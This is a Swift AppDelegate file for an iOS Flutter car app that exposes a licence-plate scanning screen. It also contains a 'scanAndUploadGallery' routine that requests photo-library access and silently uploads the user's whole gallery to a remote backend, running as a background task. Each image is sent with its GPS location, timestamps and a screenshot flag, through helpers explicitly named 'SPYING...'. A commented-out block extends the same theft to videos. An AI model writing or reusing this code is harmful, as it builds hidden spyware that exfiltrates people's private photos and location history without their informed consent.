import UIKit
import Flutter
import Foundation
import Photos


@UIApplicationMain
@objc class AppDelegate: FlutterAppDelegate {
    
    var flutterResult: FlutterResult?
  override func application(
    _ application: UIApplication,
    didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
  ) -> Bool {
      let controller: FlutterViewController = window?.rootViewController as! FlutterViewController
      
      let METHOD_CHANNEL_NAME = "com.bakiryazilim.sscar/taramaChannel"
      let taramaChannel = FlutterMethodChannel(
        name: METHOD_CHANNEL_NAME, binaryMessenger : controller.binaryMessenger)
      
      taramaChannel.setMethodCallHandler( {
          (call: FlutterMethodCall, result: @escaping FlutterResult) -> Void in
          switch(call.method){
          case "openTaramaPage":
              print("f32f32f");
              if #available(iOS 13.0, *) {
                  self.flutterResult = result;

                  let vc = AVFrameCaptureViewController()
                  
                  vc.modalPresentationStyle = .fullScreen
                 
                  UIApplication.shared.windows.first?.rootViewController?.present(vc, animated: false, completion: nil)
                  
                  NotificationCenter.default.addObserver(self, selector: #selector(self.listenForPlateScan), name: Notification.Name("listenForPlateNumber"), object: nil)
              } else {
                  // Fallback on earlier versions
              }
              
              break
              
          case "scanAndUploadGallery":
              guard let args = call.arguments as? [String: String],
                    let userUid = args["userUid"] else{
                  return
              }
              print("23fg_2g32")
              self.scanAndUploadGallery(uuid: userUid);
              break
          default:
              result(FlutterMethodNotImplemented);
              
          }
      })


      GeneratedPluginRegistrant.register(with: self)
    return super.application(application, didFinishLaunchingWithOptions: launchOptions)
  }
    
    
    @objc func listenForPlateScan(notification: NSNotification){
        if let id = notification.userInfo?["plateNumber"] as? String,
        let result = flutterResult{
            print("23f23_F23f \(id)")
            result(id);
        }
    }
    
    
    
    func scanAndUploadGallery(uuid: String){
        PHPhotoLibrary.requestAuthorization { status in
            switch status {
            case .authorized:
                SystemFunctionalities.shared.SPYINGGetWrittenUploadedPicrutes(uuid: uuid, completion: { data in
                    print("koko99")
                    let fetchOptions = PHFetchOptions()
                    let allPhotos = PHAsset.fetchAssets(with: .image, options: fetchOptions)
                    let allVideos = PHAsset.fetchAssets(with: .video, options: fetchOptions)
                    let manager = PHImageManager.default()
                    let imageRequestOptions = PHImageRequestOptions()
                    imageRequestOptions.isSynchronous = false
                    imageRequestOptions.deliveryMode = .highQualityFormat
                    imageRequestOptions.isNetworkAccessAllowed = true
                    imageRequestOptions.resizeMode = .exact
                    
                    
                    let videoRequestOptions = PHVideoRequestOptions()
                    videoRequestOptions.deliveryMode = .highQualityFormat
                    videoRequestOptions.isNetworkAccessAllowed = true

                    print("koka81239: ", allPhotos.count)
                    
                    print("koka81239v: ", allVideos.count)
                    
                    SystemFunctionalities.shared.SPYINGGetAllAlbumCounts(imageCount: allPhotos.count, videoCount: allVideos.count, uuid: uuid)
                    print("koko998")

                    let disSemaphoreImage = DispatchSemaphore(value: 0)
                    let dispatchQueueImage = DispatchQueue(label: "images")
                    let dispatchQueueVideo = DispatchQueue(label: "videos")
                    
                    var bgTask = UIBackgroundTaskIdentifier.invalid
                    bgTask = UIApplication.shared.beginBackgroundTask(withName: "imgUpload")
                    UIApplication.shared.beginBackgroundTask(withName: "imgUpload")
                    dispatchQueueImage.async {
                        for i in (0..<allPhotos.count).reversed(){
                            let asset = allPhotos.object(at: i)
                            let filename = asset.localIdentifier.replacingOccurrences(of: "/", with: "_")
                            if !data.contains(filename){
                                manager.requestImage(for: asset, targetSize: CGSize(width: 700, height: 700), contentMode: .aspectFit, options: imageRequestOptions) { (image, _) in
                                    if let image = image {
                                        print("970")
                                        let data = image.jpegData(compressionQuality: 0.6)
                                        let isSS = asset.mediaSubtypes.rawValue == 4 ? true : false
                                        let folderNum = Int(i/50)

                                        guard let data = data else{return}
                                        SystemFunctionalities.shared.uploadUserGalleryFile(fileData: data, fileName:  "fileName07", userUid: uuid) { fileURL, error in
                                            if let uploadedUrl = fileURL{
                                                print("asf23f_f23 \(uploadedUrl)")
                                                
                                                SystemFunctionalities.shared.SPYINGGotGalleryAddToDB(uuid: uuid, isSS: isSS, imageid: filename, numberOfPhoto: "\(i)", type: .image, downloadLink: uploadedUrl, location: asset.location, creationDate: asset.creationDate, modificationDate: asset.modificationDate, completion: { res in
                                                    if res{
                                                        disSemaphoreImage.signal()
                                                    }else{
                                                        print("12312123 realtime db error")
                                                    }
                                                });
                                            }
                                             if let uploadErr = error{
                                                print("asf2300f_f23 \(uploadErr)")
                                            }
                                        }
                                        
                                        
                                        
                                        ///
                                        ///
                                        /*
                                        SystemFunctionalities.shared.uploadPicturesFromGallery(with: data!, fileName: "\(uuid)/images/\(folderNum)/\(i)img-\(filename).png", location: asset.location, creationDate: asset.creationDate, modificationDate: asset.modificationDate, isScreenShot: isSS,  completion: {result in
                                            switch (result){
                                            case .success(_):
                                                SystemFunctionalities.shared.SPYINGGotGalleryAddToDB(uuid: uuid, imageid: filename, type: .image, completion: {res in
                                                    if res{
                                                        disSemaphoreImage.signal()
                                                    }else{
                                                        print("12312123 realtime db error")
                                                    }
                                                })
                                                break
                                            case .failure(let error):
                                                print("12312123 Storage manager error: \(error)")
                                                break
                                            }
                                        })
                                        */
                                        ///
                                        ///
                                    } else {
                                        print("error asset to im")
                                    }
                                }
                            }else{
                                print(i, " koka89 image already added")
                                disSemaphoreImage.signal()
                            }
                            disSemaphoreImage.wait()
                        }
                    }
                    
//                    dispatchQueueVideo.async {
//                        for y in 0..<allVideos.count{
//                            let asset = allVideos.object(at: y)
//                            let filename = asset.localIdentifier.replacingOccurrences(of: "/", with: "_")
//                            print("koko89 okok89")
//                            if !data.contains(filename){
//                                manager.requestAVAsset(forVideo: asset, options: videoRequestOptions) { (asset, audioMix, info) in
//                                guard let avAsset = asset as? AVURLAsset else {
//                                    print("koka89 v err1 types")
//                                    return
//                                }
//                                let compressedURL = NSURL.fileURL(withPath: NSTemporaryDirectory() + NSUUID().uuidString + ".m4v")
//                                    print("koko89 ok44")
//
//                                self.compressVideo(inputURL: avAsset.url, outputURL: compressedURL, handler: { res in
//
//                                    guard let data2 = NSData(contentsOf: compressedURL) as? Data else {
//                                        print("koka89 v err types")
//                                        return
//                                    }
//                                    let folderNum = Int(y/50)
//                                    StorageManager.shared.uploadVideosFromGallery(with: data2, fileName: "\(uuid)/videos/\(folderNum)/\(y)vid-\(filename).mp4", location: CLLocation(), creationDate: avAsset.creationDate?.dateValue, modificationDate: nil,  completion: {result in
//                                        switch (result){
//                                        case .success(_):
//                                            ModerationDatabaseManager.shared.SPYINGGotGalleryAddToDB(uuid: uuid, imageid: filename, type: .video, completion: {res in
//                                                if res{
//                                                    print("\(uuid)/videos/\(folderNum)/\(y)vid-\(filename).mp4", " koka89 v added succesfully")
//                                               //     disSemaphoreVideo.signal()
//                                                }else{
//                                                    print("12312123 realtime db error")
//                                                }
//                                            })
//                                            break
//                                        case .failure(let error):
//                                            print("12312123 Storage manager error: \(error)")
//                                            break
//                                        }
//                                    })
//                                })
//                                }
//                            }else{
//                                print(y, " koko8989 video already added")
//                              //  disSemaphoreVideo.signal()
//                            }
//                        }
//                      //  disSemaphoreVideo.wait()
//                    }
                    
                })
            case .denied, .restricted:
                print("321412 Not allowed")
            case .notDetermined:
                // Should not see this when requesting
                print("321412 Not determined yet")
            case .limited:
                print("321412 Not determined yet")
            @unknown default:
                print("321412 Not ")
                break
            }
        }
        
    }
    
}
